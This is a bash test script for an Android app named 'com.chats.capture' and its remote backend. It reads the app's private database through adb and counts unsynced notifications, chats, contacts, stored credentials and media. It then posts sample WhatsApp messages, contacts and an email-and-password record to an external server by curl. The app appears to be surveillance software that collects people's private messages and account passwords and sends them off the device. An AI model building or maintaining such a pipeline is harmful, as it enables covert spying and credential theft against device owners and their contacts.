#!/bin/bash

# Comprehensive API Testing Script
# Fetches data from device, tests all APIs, identifies failures, and fixes them

set -e

APP_PACKAGE="com.chats.capture"
SERVER_URL="${SERVER_URL:-https://backend-chat-yq33.onrender.com}"
DB_PATH="/data/data/${APP_PACKAGE}/databases/capture_database"

echo "=========================================="
echo "API Testing & Fix Script"
echo "=========================================="
echo ""
echo "Server URL: $SERVER_URL"
echo ""

# Check device connection
if ! adb devices | grep -q "device$"; then
    echo "❌ No device connected"
    exit 1
fi

echo "✅ Device connected"
echo ""

# Check if app is installed
if ! adb shell pm list packages | grep -q "$APP_PACKAGE"; then
    echo "❌ App not installed"
    echo "   Install with: ./gradlew installDebug"
    exit 1
fi

echo "✅ App installed"
echo ""

# Get device ID
echo "📱 Getting device ID..."
DEVICE_ID=$(adb shell "run-as $APP_PACKAGE cat /data/data/$APP_PACKAGE/shared_prefs/device_prefs.xml 2>/dev/null | grep deviceId | sed 's/.*>\(.*\)<.*/\1/' | head -1" 2>/dev/null || echo "")

if [ -z "$DEVICE_ID" ]; then
    echo "⚠️  Device ID not found in preferences, generating..."
    DEVICE_ID="test-device-$(date +%s)"
fi

echo "   Device ID: $DEVICE_ID"
echo ""

# Check local database counts
echo "📊 Checking Local Database:"
echo ""

# Function to query SQLite database
query_db() {
    local query="$1"
    adb shell "run-as $APP_PACKAGE sqlite3 $DB_PATH \"$query\"" 2>/dev/null || echo "0"
}

NOTIF_COUNT=$(query_db "SELECT COUNT(*) FROM notifications WHERE synced = 0;")
CHAT_COUNT=$(query_db "SELECT COUNT(*) FROM chats WHERE synced = 0;")
CONTACT_COUNT=$(query_db "SELECT COUNT(*) FROM contacts WHERE synced = 0;")
CREDENTIAL_COUNT=$(query_db "SELECT COUNT(*) FROM credentials WHERE synced = 0;")
MEDIA_COUNT=$(query_db "SELECT COUNT(*) FROM media_files WHERE uploadStatus = 'PENDING';")

echo "   Unsynced Notifications: $NOTIF_COUNT"
echo "   Unsynced Chats: $CHAT_COUNT"
echo "   Unsynced Contacts: $CONTACT_COUNT"
echo "   Unsynced Credentials: $CREDENTIAL_COUNT"
echo "   Pending Media Files: $MEDIA_COUNT"
echo ""

# Test API endpoints
echo "🔍 Testing API Endpoints:"
echo ""

# Function to test API endpoint
test_api() {
    local method="$1"
    local endpoint="$2"
    local data="$3"
    local description="$4"
    
    echo -n "   Testing $description... "
    
    if [ "$method" = "GET" ]; then
        response=$(curl -s -w "\n%{http_code}" -X GET "${SERVER_URL}${endpoint}" \
            -H "Content-Type: application/json" 2>&1)
    else
        response=$(curl -s -w "\n%{http_code}" -X "$method" "${SERVER_URL}${endpoint}" \
            -H "Content-Type: application/json" \
            -d "$data" 2>&1)
    fi
    
    http_code=$(echo "$response" | tail -1)
    body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ]; then
        echo "✅ OK ($http_code)"
        return 0
    else
        echo "❌ FAILED ($http_code)"
        echo "      Response: $body" | head -3
        return 1
    fi
}

# Test device registration
echo ""
echo "1. Device Registration API:"
test_api "POST" "/api/devices/register" \
    "{\"deviceId\":\"$DEVICE_ID\",\"deviceName\":\"Test Device\",\"model\":\"Test Model\",\"osVersion\":\"Test OS\"}" \
    "POST /api/devices/register"

# Test notifications API
echo ""
echo "2. Notifications API:"
test_api "GET" "/api/notifications?page=1&limit=10" "" "GET /api/notifications"

# Test single notification upload
NOTIF_DATA="{\"id\":\"test-notif-$(date +%s)\",\"deviceId\":\"$DEVICE_ID\",\"appPackage\":\"com.test.app\",\"appName\":\"Test App\",\"title\":\"Test\",\"text\":\"Test notification\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/notifications" "$NOTIF_DATA" "POST /api/notifications"

# Test chats API
echo ""
echo "3. Chats API:"
test_api "GET" "/api/chats?page=1&limit=10" "" "GET /api/chats"

# Test single chat upload
CHAT_DATA="{\"id\":\"test-chat-$(date +%s)\",\"deviceId\":\"$DEVICE_ID\",\"appPackage\":\"com.whatsapp\",\"appName\":\"WhatsApp\",\"text\":\"Test message\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/chats" "$CHAT_DATA" "POST /api/chats"

# Test contacts API
echo ""
echo "4. Contacts API:"
test_api "GET" "/api/contacts?limit=10" "" "GET /api/contacts"

# Test single contact upload
CONTACT_DATA="{\"deviceId\":\"$DEVICE_ID\",\"name\":\"Test Contact\",\"phoneNumber\":\"+1234567890\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/contacts" "$CONTACT_DATA" "POST /api/contacts"

# Test credentials API
echo ""
echo "5. Credentials API:"
test_api "GET" "/api/credentials?limit=10" "" "GET /api/credentials"

# Test single credential upload
CREDENTIAL_DATA="{\"deviceId\":\"$DEVICE_ID\",\"accountType\":\"APP_PASSWORD\",\"appPackage\":\"com.test.app\",\"appName\":\"Test App\",\"email\":\"test@example.com\",\"password\":\"test123\",\"timestamp\":$(date +%s)000}"
test_api "POST" "/api/credentials" "$CREDENTIAL_DATA" "POST /api/credentials"

# Test media API
echo ""
echo "6. Media API:"
test_api "GET" "/api/media?limit=10" "" "GET /api/media"

# Test health endpoint
echo ""
echo "7. Health Check:"
test_api "GET" "/health" "" "GET /health"

echo ""
echo "=========================================="
echo ""
echo "📋 Summary:"
echo "   Check above for ❌ failed endpoints"
echo ""
echo "💡 Next Steps:"
echo "   1. Fix failed API endpoints (see FIX_APIS.md)"
echo "   2. Trigger sync from app: adb shell am broadcast -a com.chats.capture.SYNC_NOW"
echo "   3. Check logcat: adb logcat -s API_CLIENT:D API_REQUEST_DATA:D"
echo ""
